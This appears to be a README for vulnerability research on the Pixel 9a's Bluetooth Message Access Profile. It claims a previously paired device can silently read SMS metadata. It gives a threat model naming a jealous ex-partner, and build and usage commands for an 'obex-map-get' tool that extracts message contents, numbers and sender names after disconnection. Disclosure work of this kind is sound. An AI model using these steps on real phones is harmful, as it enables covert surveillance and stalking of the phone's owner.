# Pixel 9a Bluetooth MAP Research

Research and tooling for a design-level authorization gap in Android's Message
Access Profile (MAP) implementation on the Google Pixel 9a: a previously bonded
Bluetooth device can silently retrieve SMS/MMS metadata with no on-device
notification and no per-session consent prompt.

---

## TL;DR

| Item | Value |
|---|---|
| Target service | `com.android.bluetooth.map.BluetoothMapObexServer`, RFCOMM channel 4 (subject to change per update) |
| Behavior | Bonded device silently retrieves SMS/MMS metadata |
| Data exposed | Sender names, phone numbers, timestamps, message handles (metadata) |
| User interaction | None after pairing (no notification, no consent prompt) |
| Confirmed on | Android 17, Pixel 9a, build `CP2A.260705.006` |
| Classification | Design-level authorization gap |

---

## Threat model

This tool demonstrates an insider-threat scenario: someone with legitimate —
often temporary — access to a device establishes a Bluetooth pairing record,
then extracts message metadata much later, without the owner's knowledge.

Examples:

- An IT support worker who sets up company phones, pairs their own device during
  provisioning, and retrieves messages after the phone is issued to an employee
- A jealous ex-partner who paired their device while they had access to the phone
- Anyone with brief unsupervised access to an unlocked phone who completes a
  pairing

Because the pairing record persists for an indefinite period, the silent
retrieval can happen well after the initial access — with no notification, pop-up, or
other indication on the phone at the time of extraction.

---

## Repository layout

```
└── README.md    # this file
```

---

## Build

```bash
cd ~/pixel_vrp_repro/
sudo apt update
sudo apt install -y build-essential pkg-config libbluetooth-dev libssl-dev cargo bluez
sudo apt install bluez libbluetooth-dev build-essential cargo hexdump
cargo build --release
```

---

## Usage

Extract the MAP channel for the target device:

```bash
MAP_CHANNEL=$(sdptool -i hci0 browse [PIXEL_MAC] | grep -A 5 "Message Access" | grep "Channel" | grep -o "[0-9]*")
echo "MAP Channel: $MAP_CHANNEL"
```

Run the exfiltration tool (this triggers a pairing pop-up on the target — the
user must allow message access, after which text-message metadata is extracted):

```bash
./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
```

> **Note:** Sometimes this command fails to output the XML data. If so, run:

```bash
stdbuf -i0 -o0 -e0 ./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=5000 --out-dir evidence
```

After pairing, disconnect the computer from the phone:

```
Settings -> Connected devices -> Select paired computer -> Disconnect
```

Run the command again without the connection. The exfiltration of a text
message, phone number, and sender name prints to the terminal with no
notification, pop-up, or other indication on the phone:

```bash
./target/release/obex-map-get [PIXEL_MAC] 4 --repeat=1 --preview-body=512
```
